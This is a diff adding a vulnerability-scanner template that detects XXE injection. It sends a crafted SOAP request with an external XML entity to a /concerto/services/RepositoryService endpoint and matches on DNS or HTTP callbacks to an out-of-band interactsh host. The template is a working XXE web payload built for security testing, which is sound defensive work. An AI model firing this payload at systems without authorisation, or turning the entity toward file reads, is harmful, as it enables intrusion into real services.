@@ -1,0 +1,60 @@
+id: xxe-injection-check
+
+info:
+  name: XXE Injection Detection
+  author: YourName
+  severity: medium
+  description: |
+    This template checks for XXE (XML External Entity) injection by sending a crafted SOAP request with an external entity pointing to an OAST endpoint.
+  tags: xxe, oast, soap
+
+http:
+  - raw:
+      - |
+        POST /concerto/services/RepositoryService HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138", "Brave";v="138"
+        Sec-Ch-Ua-Mobile: ?0
+        Sec-Ch-Ua-Platform: "macOS"
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
+        Sec-Gpc: 1
+        Accept-Language: en-US,en;q=0.9
+        Sec-Fetch-Site: none
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-User: ?1
+        Sec-Fetch-Dest: document
+        Accept-Encoding: gzip, deflate, br
+        Priority: u=0, i
+        Connection: keep-alive
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 610
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE soapenv:Envelope [
+          <!ENTITY xxe SYSTEM "http://{{interactsh-url}}">
+        ]>
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
+                          xmlns:rep="http://example.com/services/repository">
+           <soapenv:Header/>
+           <soapenv:Body>
+              <rep:getUIBundleObjectXml>
+                 <rep:uiBundleRequestXml>&xxe;</rep:uiBundleRequestXml>
+              </rep:getUIBundleObjectXml>
+           </soapenv:Body>
+        </soapenv:Envelope>
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+
+    matchers-condition: or
